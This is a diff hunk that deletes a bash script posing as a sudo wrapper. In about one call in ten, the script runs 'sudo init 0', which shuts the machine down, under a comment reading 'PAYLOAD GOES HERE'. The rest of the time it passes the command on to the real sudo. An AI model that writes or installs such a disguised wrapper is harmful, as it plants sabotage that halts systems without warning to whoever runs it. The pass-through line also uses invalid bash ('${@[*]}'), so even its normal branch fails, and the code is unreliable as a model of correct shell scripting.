@@ -1,9 +1,0 @@
-#!/usr/bin/env bash
-# Sudo, but with extra sus, like the imposter.
-if [[ "$((1 + RANDOM % 10))" = "1" ]]; then
-    # PAYLOAD GOES HERE
-    /usr/bin/sudo init 0
-    exit $?
-fi
-/usr/bin/sudo "${@[*]}" <&0
-exit $?
